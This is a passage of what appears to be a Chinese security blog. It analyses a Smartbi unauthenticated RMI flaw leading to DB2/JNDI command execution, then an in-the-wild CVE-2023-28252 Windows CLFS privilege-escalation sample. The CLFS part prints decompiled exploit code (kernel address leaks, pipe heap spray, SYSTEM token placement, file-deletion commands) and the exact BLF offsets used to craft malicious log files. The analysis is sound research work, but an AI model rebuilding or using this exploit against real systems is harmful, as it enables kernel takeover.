FreeQueryModule.getInstance().getUserManagerModule().login(headerUserName, headerPassword); if (isAutoLogin) { request.setAttribute(\u0026#34;isNeedAutoLogout\u0026#34;, \u0026#34;true\u0026#34;); } } } 而*.stub并未经过这个filter的处理，也就是未授权即可访问。\n转到Smartbi的RMIServlet中有如下代码，进行GET请求时，携带jsonpCallback参数即可转到doPost方法，该方法通过RMIUtil.parseRMIInfo方法获取RMI信息，跟进。\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException { String uri = req.getRequestURI(); try { String jsonpCallback = req.getParameter(\u0026#34;jsonpCallback\u0026#34;); if (StringUtil.isNullOrEmpty(jsonpCallback)) { ... } else { doPost(req, resp); } } catch (IOException e) { LOG.error(uri + \u0026#34;\\n\u0026#34; + e.getMessage(), e); } } /* JADX WARN: Finally extract failed */ @Override // smartbi.framework.rmi.IRMIServlet public void doPost(HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException { RMIModule.getInstance().doStartRequest(request); TraceConfig traceConfig = (TraceConfig) request.getSession().getAttribute(\u0026#34;TraceConfig\u0026#34;); if (this.tracedetail \u0026amp;\u0026amp; traceConfig == null) { traceConfig = new TraceConfig(); request.getSession().setAttribute(\u0026#34;TraceConfig\u0026#34;, traceConfig); } RMIInfo rmiInfo = RMIUtil.parseRMIInfo(request, true); String className = rmiInfo == null ? null : rmiInfo.getClassName(); String methodName = rmiInfo == null ? null : rmiInfo.getMethodName(); String params = rmiInfo == null ? null : rmiInfo.getParams(); ... try { String resultStr = processExecute(request, className, methodName, params); RMIModule.getInstance().doRollback(); RMIModule.getInstance().doEndRequest(request); ... } } catch (Throwable th) { RMIModule.getInstance().doRollback(); RMIModule.getInstance().doEndRequest(request); throw th; } } RMIUtil.parseRMIInfo方法首先判断uri是否是/vision/RMIServlet，而后获取请求的className、methodName、params参数，并返回RMIInfo对象\npublic static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) { if (!\u0026#34;/vision/RMIServlet\u0026#34;.equals(request.getServletPath()) \u0026amp;\u0026amp; !forceParse) { return null; } RMIInfo info = getRMIInfoFromRequest(request); if (info != null) { return info; } String className = request.getParameter(\u0026#34;className\u0026#34;); String methodName = request.getParameter(\u0026#34;methodName\u0026#34;); String params = request.getParameter(SimpleReportBO.EL_PARAMS); if (StringUtil.isNullOrEmpty(className) \u0026amp;\u0026amp; StringUtil.isNullOrEmpty(methodName) \u0026amp;\u0026amp; StringUtil.isNullOrEmpty(params) \u0026amp;\u0026amp; request.getContentType() != null \u0026amp;\u0026amp; request.getContentType().startsWith(\u0026#34;multipart/form-data;\u0026#34;)) { DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try { List\u0026lt;FileItem\u0026gt; fileItems = upload.parseRequest(request); request.setAttribute(ATTR_KEY_UPLOAD_FILE_ITEMS, fileItems); for (FileItem fileItem : fileItems) { if (fileItem.isFormField()) { String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(\u0026#34;UTF-8\u0026#34;); if (\u0026#34;className\u0026#34;.equals(itemName)) { className = itemValue; } else if (\u0026#34;methodName\u0026#34;.equals(itemName)) { methodName = itemValue; } else if (SimpleReportBO.EL_PARAMS.equals(itemName)) { params = itemValue; } else if (\u0026#34;encode\u0026#34;.equals(itemName)) { encodeString = itemValue; } } } } catch (FileUploadException | UnsupportedEncodingException e) { LOG.error(e.getMessage(), e); } if (!StringUtil.isNullOrEmpty(encodeString)) { String[] decode = (String[]) CodeEntry.decode(encodeString, true); className = decode[0]; methodName = decode[1]; params = decode[2]; } } if (className == null \u0026amp;\u0026amp; methodName == null) { className = (String) request.getAttribute(\u0026#34;className\u0026#34;); methodName = (String) request.getAttribute(\u0026#34;methodName\u0026#34;); params = (String) request.getAttribute(SimpleReportBO.EL_PARAMS); } RMIInfo info2 = new RMIInfo(); info2.setClassName(className); info2.setMethodName(methodName); info2.setParams(params); request.setAttribute(ATTR_KEY_RMI_INFO, info2); return info2; } 而后调用processExecute方法，最终通过exceptionToNode方法通过反射调用了对应的方法\npublic String processExecute(HttpServletRequest request, String className, String methodName, String params) { Map\u0026lt;Integer, Integer\u0026gt; map; ClientService service = RMIModule.getInstance().getService(className); ClientService operationFailLogService = RMIModule.getInstance().getService(\u0026#34;OperationLogService\u0026#34;); String resultStr = null; JSONArray jsonParams = null; try { } catch (Exception ce) { if (Framework.getInstance().getExceptionHandler() != null) { return Framework.getInstance().getExceptionHandler().processException(ce); } if (className != null \u0026amp;\u0026amp; methodName != null) { try { ObjectNode resultNode = exceptionToNode(className, methodName, ce); resultStr = resultNode.toString(); String failResult = resultNode.has(\u0026#34;detail\u0026#34;) ? resultNode.get(\u0026#34;detail\u0026#34;).asText((String) null) : null; if (StringUtil.isNullOrEmpty(failResult)) { failResult = resultNode.get(\u0026#34;result\u0026#34;).asText(); } List\u0026lt;Object\u0026gt; listParams = null; if (0 != 0) { listParams = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; jsonParams.length(); i++) { listParams.add(jsonParams.get(i)); } } Object[] objParams = {className, methodName, listParams, failResult}; operationFailLogService.executeInternal(\u0026#34;addOperationFailLog\u0026#34;, objParams); } catch (Exception e) { LOG.error(e.getMessage(), e); } } } public Object executeInternal(String methodName, Object[] objParams) { try { Method method = StringUtil.isNullOrEmpty(methodName) ? null : this.methodList.get(methodName); if (method == null) { throw new SmartbiException(CommonErrorCode.METHOD_NAME_ERROR).setDetail(StringUtil.replaceHTML(methodName)); } Object result = method.invoke(this.module, objParams); return result; } catch (InvocationTargetException ex) { if (ex.getCause() instanceof SmartbiException) { 再来回顾一下补丁，补丁中说该漏洞是对钱一个漏洞的绕过，经过上面的分析可知*.stub接口无需身份验证，所以可以通过*.stub接口利用Smartbi内的反射调用到存在漏洞的类。\n在补丁中有如下，通过全局搜索类名DataSourceService便可知道漏洞代码。\n\u0026#34;PATCH_20221122\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;修复了 DB2 命令执行漏洞 (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;修復了 DB2 命令執行漏洞 (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;/vision/RMIServlet\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnectionList\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] },{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnection\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] }] }] }, 该代码中的参数均为可控，故可以通过控制JDBC url的方式执行恶意代码，此时可以通过DB2执行代码。\npublic void testConnectionList(List\u0026lt;IDataSource\u0026gt; list) { for (IDataSource dataSource : list) { MetaDataServiceImpl.getInstance().testConnection(dataSource); } } public void testConnection(IDataSource dataSource) { int preIndex; ISystemConfig systemConfig; DataSource ds = new DataSource(); String url = dataSource.getUrl(); ds.setId(UUIDGenerator.generate()); ds.setName(dataSource.getName()); ds.setAlias(dataSource.getAlias()); ds.setDriver(dataSource.getDriver()); ds.setDesc(dataSource.getDesc()); ds.setDbCharset(dataSource.getDbCharset()); ds.setUrl(url); ds.setUser(dataSource.getUser()); ds.setDriverType(dataSource.getDriverType()); ds.setMaxConnection(dataSource.getMaxConnection()); ds.setValidationQuery(dataSource.getValidationQuery()); ds.setPassword(dataSource.getPassword()); ds.setTransactionIsolation(dataSource.getTransactionIsolation()); ds.setValidationQueryMethod(dataSource.getValidationQueryMethod()); ds.setAuthenticationType(dataSource.getAuthenticationType()); ds.setExtendProp(dataSource.getExtendProp()); ds.setDriverCatalog(dataSource.getDriverCatalog()); if (dataSource.getPassword() == null \u0026amp;\u0026amp; !StringUtil.isNullOrEmpty(dataSource.getId())) { DataSource dbDs = loadDataSource(dataSource.getId()); ds.setPassword(dbDs.getPassword()); } if (StringUtil.isNullOrEmpty(dataSource.getId()) \u0026amp;\u0026amp; ds.getDriverType() == DBType.HADOOP_HIVE \u0026amp;\u0026amp; (systemConfig = FreeQueryModule.getInstance().getSystemConfigService().getSystemConfig(\u0026#34;MPP_SSH_CONFIG\u0026#34;)) != null) { String longValue = systemConfig.getLongValue(); if (StringUtils.isNotBlank(longValue)) { JSONObject jsonObject = JSONObject.fromString(longValue); if (jsonObject.has(SFTPConstants.HIVE_PASSWORD)) { String pwd = jsonObject.getString(SFTPConstants.HIVE_PASSWORD); if (StringUtils.isNotBlank(pwd)) { ds.setPassword(pwd); } } } } Connection conn = null; try { try { conn = ConnectionPool.getInstance().getConnection(ds); if (conn == null) { throw new SmartbiException(CommonErrorCode.JDBC_DRIVER_ERROR).setDetail(ds.getDriver() + \u0026#34;:\u0026#34; + ds.getUrl()); } if (DBType.PRESTO == dataSource.getDriverType()) { PreparedStatement stat = JdbcUtil.prepareStatement(conn, \u0026#34;SELECT 1\u0026#34;, dataSource.getDriverType()); try { PreparedStatementWarp.executeQuery(stat, DBSQLUtil.createSQLLog(ds.getAlias(), SmartbiXDataSetUtil.OTHER, FreeQueryModule.getInstance().getStateModule(), \u0026#34;SELECT 1\u0026#34;)); } catch (Exception e) { if (e instanceof SmartbiException) { throw ((SmartbiException) e); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e).setDetail(StringUtil.getLanguageValue(\u0026#34;InvalidConnection\u0026#34;)); } } else if (DBType.CLICK_HOUSE == dataSource.getDriverType() \u0026amp;\u0026amp; (preIndex = url.indexOf(\u0026#34;clusterName=\u0026#34;)) \u0026gt; -1) { String clusterName = url.substring(preIndex + \u0026#34;clusterName=\u0026#34;.length()); int suffixIndex = clusterName.indexOf(\u0026#34;\u0026amp;\u0026#34;); if (suffixIndex \u0026gt; -1) { clusterName = clusterName.substring(0, suffixIndex); } if (!StringUtil.isNullOrEmpty(clusterName)) { String validSql = \u0026#34;drop table if exists t_testcluster on cluster \u0026#34; + clusterName; PreparedStatement stat2 = JdbcUtil.prepareStatement(conn, validSql, dataSource.getDriverType()); try { PreparedStatementWarp.executeQuery(stat2, DBSQLUtil.createSQLLog(ds.getAlias(), SmartbiXDataSetUtil.OTHER, FreeQueryModule.getInstance().getStateModule(), validSql)); } catch (Exception e2) { if (e2.getLocalizedMessage().indexOf(\u0026#34;Requested cluster \u0026#39;\u0026#34; + clusterName + \u0026#34;\u0026#39; not found\u0026#34;) \u0026gt; -1) { throw new SmartbiException(CommonErrorCode.CLICK_HOUSE_CLUSTER_NOT_FOUND, e2).setDetail(clusterName); } if (e2 instanceof SmartbiException) { throw ((SmartbiException) e2); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e2).setDetail(StringUtil.getLanguageValue(\u0026#34;InvalidConnection\u0026#34;)); } } } } catch (Exception e3) { if (e3 instanceof SmartbiException) { throw ((SmartbiException) e3); } String detail = SmartbiXDataSetUtil.OTHER; if (e3 instanceof ClassNotFoundException) { detail = StringUtil.getLanguageValue(\u0026#34;DBDriverNoFound\u0026#34;); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e3).setDetail(detail + e3.getMessage()); } } finally { if (conn != null) { try { conn.close(); } catch (Throwable th) { Logger.getLogger(getClass()).debug(SmartbiXDataSetUtil.OTHER); } } if (!ds.getUrl().startsWith(\u0026#34;JNDI:\u0026#34;)) { ConnectionPool.getInstance().closePool(ds); } } } 题外话，我本身不懂Java那一套，只是按照粗浅的代码理解去分析漏洞，有机会去分析一下JNDI注入原理。\n参考链接\nhttps://www.smartbi.com.cn/patchinfo\nCreated at 2023-06-16T16:07:41+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/","title":"CVE-2023-28252","tags":["漏洞分析"],"description":"","content":"基本信息 clfs中存在权限提升漏洞。\n影响版本 略\n环境搭建 windows 10 21h2 19044.2728 windbg x64dbg 技术分析\u0026amp;调试 静态分析\n样本加了Themida的壳，参考\rhttps://github.com/VenTaz/Themidie对其进行绕过。\n脱壳之后dump出原始样本进行分析，如下。核心逻辑在InitAndHeapSpray函数中：\nint __cdecl main(int argc, const char **argv, const char **envp) { ..... v3 = InitAndHeapSpray(); if ( !sub_7FF662B24F98() ) goto LABEL_20; if ( !v4 ) sub_7FF662B28D3C(); LOBYTE(v10) = 1; sub_7FF662B24CA4(v10, 0i64); return v3; } 该函数首先清空工作目录，而后通过查询注册表获取系统版本，在通过NtQuerySystemInformation函数并传入SystemExtendedHandleInformation参数来获取System及自身token地址，其逻辑和CVE-2022-37969基本一样\nsub_7FF662B265E4((int)NtCurrentTeb()-\u0026gt;NtTib.FiberData + v0); system(\u0026#34;del /f C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\.contain* 2\u0026gt; nul 1\u0026gt; nul\u0026#34;);// 删除文件 system(\u0026#34;del /f C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog* 2\u0026gt; nul 1\u0026gt; nul\u0026#34;); system(\u0026#34;del /f C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\p_* 2\u0026gt; nul 1\u0026gt; nul\u0026#34;); *(_QWORD *)\u0026amp;dwProcessId = GetCurrentProcessId(); if ( !(unsigned int)CheckOSVersion() ) return 0i64; if ( (unsigned int)GetObjectKernelAddress() ) { sub_7FF662B21010((__int64)\u0026#34;fail RW\\\\n\u0026#34;); return 0i64; } 而后初始化并获取一系列内核函数地址，包括ClfsEarlierLsn、ClfsMgmtDeregisterManagedClient、SeSetAccessStateGenericMapping、RtlClearBit，获取方式和CVE-2022-37969基本一样。通过LoadLibraryEx在r3载入ntoskrnl.exe、clfs.sys获取到函数相对于基址的偏移，而后通过NtQuerySystemInformation并传入SystemModuleInformation获取到内核载入的所有模块的基址。通过比较模块的FullPathName来确定clfs.sys和ntoskrnl.exe在内核的基址，将内核基址和函数偏移相加即可获得函数在内核的地址\nClfsEarlierLsnKernelAddress = (__int64)GetKernelFuncAddr(\u0026#34;ClfsEarlierLsn\u0026#34;); if ( !ClfsEarlierLsnKernelAddress ) return 0i64; ClfsMgmtDeregisterManagedClientAddress = (__int64)GetKernelFuncAddr(\u0026#34;ClfsMgmtDeregisterManagedClient\u0026#34;); if ( versionFlag ) { ntoskrnl_KernelBase = FindKernelModulesBase(\u0026#34;\\\\\\\\SystemRoot\\\\\\\\system32\\\\\\\\ntoskrnl.exe\u0026#34;); Library = LoadLibraryExW(L\u0026#34;ntoskrnl.exe\u0026#34;, 0i64, 1u); v4 = 0i64; v5 = (__int64)Library; if ( Library ) { PoFxProcessorNotificationAddress = GetProcAddress(Library, \u0026#34;PoFxProcessorNotification\u0026#34;); if ( !PoFxProcessorNotificationAddress ) goto LABEL_18; sub_7FF662E7AF0D(v5); PoFxProcessorNotificationKernelAddress = (__int64)PoFxProcessorNotificationAddress + (_QWORD)ntoskrnl_KernelBase - v5; } else { PoFxProcessorNotificationKernelAddress = 0i64; } PoFxProcessorNotificationKernelAddress1 = PoFxProcessorNotificationKernelAddress; ntoskrnl_kernel_base = FindKernelModulesBase(\u0026#34;\\\\\\\\SystemRoot\\\\\\\\system32\\\\\\\\ntoskrnl.exe\u0026#34;); ntoskrnl_base = LoadLibraryExW(L\u0026#34;ntoskrnl.exe\u0026#34;, 0i64, 1u); v10 = (__int64)ntoskrnl_base; if ( !ntoskrnl_base ) { SeSetAccessStateGenericMappingAddressKernelAddr = 0i64; goto LABEL_21; } SeSetAccessStateGenericMappingAddress = GetProcAddress(ntoskrnl_base, \u0026#34;SeSetAccessStateGenericMapping\u0026#34;); if ( SeSetAccessStateGenericMappingAddress ) { sub_7FF662E7AF0D(v10); SeSetAccessStateGenericMappingAddressKernelAddr = (__int64)SeSetAccessStateGenericMappingAddress + (_QWORD)ntoskrnl_kernel_base - v10; 样本在0x5000000位置处申请大小0x100000的内存，很明显这块和CVE-2022-37969的申请内存一样，而后将ntdll.dll载入到进程中并获取NtQuerySystemInformation函数地址，通过CreateFile打开C:\\Users\\Public\\p_%08d格式文件的句柄并验证句柄有效性，接着获取到NtFsControlFile函数地址\nif ( !VirtualAlloc((LPVOID)0x5000000, 0x100000ui64, 0x3000u, 4u) ) return 0i64; v24 = rand(); memset(v96, 0, sizeof(v96)); wsprintf((__int64)v96, (__int64)L\u0026#34;C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\p_%08d\u0026#34;, v24); Filew = CreateFilew((__int64)v96, 0xC0000000i64, 0i64, 0i64, 2, 256, 0i64); if ( Filew == -1 ) { sub_7FF662E75E1F(); return 1i64; } ntdll_hmodule = (HMODULE)LoadLibrary((__int64)L\u0026#34;ntdll\u0026#34;); NtQuerySystemInformationAddress = (NTSTATUS (__stdcall *)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(ntdll_hmodule, \u0026#34;NtQuerySystemInformation\u0026#34;); if ( NtQuerySystemInformationAddress ) { for ( i = 20; ; i = v82 ) ...... } if ( !v31 ) { ...... while ( 1 ) { object = (__int64)*(p_UniqueProcessId - 1); if ( v33 == *p_UniqueProcessId \u0026amp;\u0026amp; p_UniqueProcessId[1] == (HANDLE)Filew )// 这里获取的是前面通过CreateFile返回的句柄object break; v27 = (unsigned int)(v27 + 1); p_UniqueProcessId += 5; if ( (int)v27 \u0026gt;= v30-\u0026gt;NumberOfHandles ) goto LABEL_46; } qword_7FF662B44710 = (__int64)*(p_UniqueProcessId - 1);// Object if ( object ) goto LABEL_51; } else { LABEL_46: qword_7FF662B44710 = 0i64; } return 1i64; } } qword_7FF662B44710 = 1i64; LABEL_51: *(_OWORD *)hReadPipe = 0i64; Size = 0i64; LODWORD(v82) = 0; if ( versionFlag ) { LODWORD(v36) = LoadModule(\u0026#34;ntdll\u0026#34;, (LPVOID)v27); NtFsControlFileAddress = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD, _DWORD, _QWORD, _DWORD))GetProcAddress(v36, \u0026#34;NtFsControlFile\u0026#34;); 样本创建匿名管道并调用NtFsControlFile函数，通过传入0x11003C，使得之后我们可以再次调用NtFsControlFile并传入0x110038来获取到管道的属性，这点利用和CVE-2022-37969一样。在创建匿名管道后通过NtQuerySystemInformation函数获取到内核中的堆信息，并通过比较堆大小和tag获取到这个管道在内核中对应的堆内存。\nif ( !CreatePipe(\u0026amp;hReadPipe[1], hReadPipe, 0i64, 0x10000u) ) { sub_7FF662E77D93(0i64); __debugbreak(); } Size = (size_t)malloc(0x2000ui64); v37 = (_WORD *)Size; memset((void *)(Size + 2), 65, 0xFFEui64); *v37 = 90; sub_7FF662B21B80(4096, \u0026#34;NpAt\u0026#34;, 1, 0i64); memset(v95, 66, 0xFFui64); NtFsControlFileAddress(hReadPipe[0], 0i64, 0i64, 0i64, v92, 0x11003C, v37, 4056, v95, 256); sub_7FF662B21B80(4096, \u0026#34;NpAt\u0026#34;, 0, (unsigned __int64 *)\u0026amp;qword_7FF662B440C8); 之后在0xFFFFFFFF地址处申请0x1000大小的内存，并将system token布局到该地址，这点和CVE-2022-37969一致。在CVE-2022-37969中该处用于写入token。\nLODWORD(v82) = system_EPROCESS \u0026amp; 0xFFF; v38 = system_EPROCESS \u0026amp; 0xFFFFFFFFFFFFF000ui64; if ( !VirtualAlloc( // 在0xFFFFFFFF地址申请内存 (LPVOID)0xFFFFFFFFi64, 0x1000ui64, 0x3000u, 4u) ) return 0i64; memset((void *)0x100000007i64, 0, 0xFF8ui64); MEMORY[0xFFFFFFFF] = v38; // 在0xFFFFFFFF写入system proc token MEMORY[0x100000007] = 0x414141414141005Ai64; 在之后就是漏洞利用的核心逻辑。创建一个日志文件Mylog并对以下的偏移进行了修改并对CRC进行了修复，这里将其称之为主blf文件。\n修改日志文件之后打开日志文件并通过NtQuerySystemInformation查询到这个日志文件的base block的内核地址，而后调用AddLogContainer为该文件添加容器。\n0x80c -\u0026gt; crc32 4字节 0x858 -\u0026gt; 0x369 4字节 0x1dd0 -\u0026gt; 0x15a0 4字节 0x1dd4 -\u0026gt; 0x1570 4字节 0x1de0 -\u0026gt; 0xC1FDF008 4字节 0x1de4 -\u0026gt; 0x30 4字节 0x1df8 -\u0026gt; 0x5000000 4字节 0x820c -\u0026gt; crc32 4字节 0x8258 -\u0026gt; 0x369 4字节 0x97D0 -\u0026gt; 0x15A0 4字节 0x97D4 -\u0026gt; 0x1570 4字节 0x97E0 -\u0026gt; 0xC1FDF008 4字节 0x97E4 -\u0026gt; 0x30 4字节 0x97F8 -\u0026gt; 0x5000000 4字节 __int64 CraftFile() { ...... wsprintf((__int64)pszLogFileName, (__int64)L\u0026#34;LOG:C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog_%08d\u0026#34;, (unsigned int)(v0 + 16385)); wsprintf((__int64)\u0026amp;unk_7FF662B44110, (__int64)L\u0026#34;C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog_%08d.blf\u0026#34;, (unsigned int)(v0 + 16385)); ::pszLogFileName = (LPCWSTR)malloc(0x500ui64); wsprintf((__int64)\u0026amp;pwszContainerPath, (__int64)L\u0026#34;C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\.container_1%d\u0026#34;, (unsigned int)(v0 + 1)); sub_7FF662E7B416((__int64)\u0026amp;unk_7FF662B44110); sub_7FF662E7B416((__int64)\u0026amp;pwszContainerPath); LogFile = CreateLogFile(pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); CloseHandle(LogFile); Buffer = 0x369; Filew = (void *)CreateFilew((__int64)\u0026amp;unk_7FF662B44110, 0xC0000000i64, 7i64, 0i64, 3, 128, 0i64); SetFilePointer(Filew, 0x858, 0i64, 1u); ...... Buffer = 0x5000000; v7 = (void *)CreateFilew((__int64)\u0026amp;unk_7FF662B44110, 0xC0000000i64, 7i64, 0i64, 3, 128, 0i64); SetFilePointer(v7, 0x1DF8, 0i64, 1u); if ( !WriteFile(v7, \u0026amp;Buffer, 4u, NumberOfBytesWritten, 0i64) ) { sub_7FF662E775CF(0i64, 0i64, L\u0026#34;Error\\\\n\u0026#34;, 0i64); sub_7FF662E77D93(1i64); __debugbreak(); } CloseHandle(v7); CrcPatchFile((__int64)\u0026amp;unk_7FF662B44110, 0x800i64, 0x7A00i64); ...... } CloseHandle(v13); CrcPatchFile((__int64)\u0026amp;unk_7FF662B44110, 0x8200i64, 0x7A00i64); dword_7FF662B449B8 = 0; *(_QWORD *)NumberOfBytesWritten = 0i64; sub_7FF662B21B80(0x7A00, \u0026#34;Clfs\u0026#34;, 1, 0i64); // 查询堆内信息 v14 = CreateLogFile(pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0);// LOG:C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog_%08d sub_7FF662B21B80(0x7A00, \u0026#34;Clfs\u0026#34;, 0, (unsigned __int64 *)NumberOfBytesWritten);// NumberOfBytesWritten 指向了最后一个clfs池，也就是最后一个clfs 基本块的地址 if ( !*(_QWORD *)NumberOfBytesWritten ) { system(\u0026#34;pause\u0026#34;); sub_7FF662E77D93(1i64); __debugbreak(); } MyLog__08d_base_block = *(_QWORD *)NumberOfBytesWritten; hLog = v14; wsprintf((__int64)::pszLogFileName, (__int64)L\u0026#34;%s\u0026#34;, pszLogFileName); pcbContainer[0] = 512i64; return ((__int64 (__fastcall *)(HANDLE, ULONGLONG *, WCHAR *, _QWORD))AddLogContainer)( hLog, pcbContainer, \u0026amp;pwszContainerPath, 0i64); } 之后通过CreateLogFile创建10个日志文件，并修改以下偏移，这里将其称之为副blf文件。\n读取0-0x400到缓冲区并将以下偏移的值修改 0x70 -\u0026gt; 0 4字节 0x06 -\u0026gt; 2 4字节 而后将这个缓冲区写入到偏移0x400处 0x06 -\u0026gt; 0x1 4字节 0x0c -\u0026gt; crc32 4字节 0x70 -\u0026gt; 0x2 4字节 0x84 -\u0026gt; 0x2 4字节 0x88 -\u0026gt; 0x4 4字节 0x8A -\u0026gt; 0x4 4字节 0x90 -\u0026gt; 0x1 4字节 0x94 -\u0026gt; 0x3 4字节 0x9C -\u0026gt; 0x2 4字节 0x406 -\u0026gt; 2 4字节 0x40c -\u0026gt; crc32 0x470 -\u0026gt; 0 4字节 0x484 -\u0026gt; 0x2 4字节 0x488 -\u0026gt; 0x13 4字节 0x48A -\u0026gt; 0x13 4字节 0x1B98 -\u0026gt; 0x65C8 0x80c -\u0026gt; crc32 0x820c -\u0026gt; crc32 0x9598 -\u0026gt; 0x65C8 void __fastcall fun_tigger(const WCHAR *a1, __int64 a2) { ...... DWORD NumberOfBytesWritten; // [rsp+44h] [rbp-14h] BYREF sub_7FF662E7B416(a2); LogFile = CreateLogFile(a1, 0xC0000000, 1u, 0i64, 4u, 0);// LOG:C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog%d%08d if ( LogFile == (HANDLE)-1i64 ) { sub_7FF662E77D93(1i64); __debugbreak(); } CloseHandle(LogFile); v5 = malloc(0x400ui64); ...... CrcPatchFile(a2, 0x800, 0x7A00u); v19 = (void *)CreateFilew(a2, 0xC0000000i64, 7i64, 0i64, 3, 128, 0i64); SetFilePointer(v19, 0x9598, 0i64, 1u); if ( !WriteFile(v19, \u0026amp;Buffer, 4u, \u0026amp;NumberOfBytesWritten, 0i64) ) { sub_7FF662E775CF(0i64, 0i64, L\u0026#34;Error\\\\n\u0026#34;, 0i64); sub_7FF662E77D93(1i64); __debugbreak(); } CloseHandle(v19); CrcPatchFile(a2, 0x8200, 0x7A00u); free(v5); } 使用匿名管道进行堆布局，通过调用func_pipespray并两次分别传入0x5000和0x4000来申请0x5000对和0x4000对匿名pipe，\nHANDLE *__fastcall func_pipespray(int a1) { bool v2; // of size_t v3; // rcx HANDLE *v4; // rbx __int64 v5; // rdi int v6; // esi v2 = (unsigned __int64)(unsigned int)a1 \u0026gt;\u0026gt; 28 != 0; v3 = (unsigned int)(16 * a1); if ( v2 ) v3 = -1i64; v4 = (HANDLE *)malloc(v3); if ( !v4 ) { sub_7FF662E77D93(1i64); __debugbreak(); } LODWORD(v5) = 0; if ( a1 \u0026gt; 0 ) { v6 = 0; do { if ( !(unsigned int)CreatePipe((__int64)\u0026amp;v4[v6], (__int64)\u0026amp;v4[v6 + 1], 0i64, 0x60i64) ) { v5 = (int)v5; if ( (int)v5 \u0026gt; 0 ) { do { CloseHandle(*v4); CloseHandle(v4[1]); v4 += 2; --v5; } while ( v5 ); } sub_7FF662E77D93(1i64); JUMPOUT(0x7FF662B227AEi64); } LODWORD(v5) = v5 + 1; v6 += 2; } while ( (int)v5 \u0026lt; a1 ); } return v4; } 首先遍历0x5000对pipe的pipe_array_a，并通过WriteFile写入长度为12的指针数组，其内容为第一个日志文件的base block。\nBuffer[0] = MyLog__08d_base_block + 0x30; Buffer[1] = MyLog__08d_base_block + 0x30; Buffer[2] = MyLog__08d_base_block + 0x30; Buffer[3] = MyLog__08d_base_block + 0x30; Buffer[4] = MyLog__08d_base_block + 0x30; Buffer[5] = MyLog__08d_base_block + 0x30; Buffer[6] = MyLog__08d_base_block + 0x30; Buffer[7] = MyLog__08d_base_block + 0x30; Buffer[8] = MyLog__08d_base_block + 0x30; Buffer[9] = MyLog__08d_base_block + 0x30; Buffer[10] = MyLog__08d_base_block + 0x30; Buffer[11] = MyLog__08d_base_block + 0x30; for ( j = 0i64; j \u0026lt; 0x5000; ++j ) { if ( !WriteFile(*v46, Buffer, 0x60u, \u0026amp;NumberOfBytesWritten, 0i64) ) { do { CloseHandle(*pipe_array_a); CloseHandle(pipe_array_a[1]); pipe_array_a += 2; --v42; } while ( v42 ); sub_7FF662E77D93(1i64); JUMPOUT(0x7FF662B243B7i64); } v46 += 2; } 而后从第0x1000对开始，释放0x667对pipe，释放结束后创建日志文件对释放后的内存进行占位\nfor ( j = 0i64; j \u0026lt; 0x5000; ++j ) { if ( !WriteFile(*v46, Buffer, 0x60u, \u0026amp;NumberOfBytesWritten, 0i64) ) { do { CloseHandle(*pipe_array_a); CloseHandle(pipe_array_a[1]); pipe_array_a += 2; --v42; } while ( v42 ); sub_7FF662E77D93(1i64); JUMPOUT(0x7FF662B243B7i64); } v46 += 2; } v48 = pipe_array_a + 0x2000; v49 = 0x667i64; do { CloseHandle(*v48); // 释放Pipe CloseHandle(v48[1]); v48 += 10; --v49; } while ( v49 ); v50 = 0xAi64; v51 = hObject; v52 = 0xAi64; v53 = pszLogFileName; do { LogFile = CreateLogFile(v53, 0xC0000000, 1u, 0i64, 4u, 0); v53 += 256; *v51++ = LogFile; --v52; } while ( v52 ); 占位结束后，对第二次申请的0x4000对pipe_array_b调用WriteFile写入指针数组，而后对0x5000030处内存进行布局，循环尝试触发漏洞，首先为创建的10个副blf文件添加log container，在每次添加容器之后，通过CreateLogFile打开主blf文件的句柄（第一个创建的日志文件。）而后尝试通过NtFsControlFileAddress函数读取token，在读取之后判断token有效性，有效则退出循环。\ndo { if ( !WriteFile(*v56, Buffer, 0x60u, \u0026amp;v87, 0i64) ) { do { CloseHandle(*pipe_array_b); CloseHandle(pipe_array_b[1]); pipe_array_b += 2; 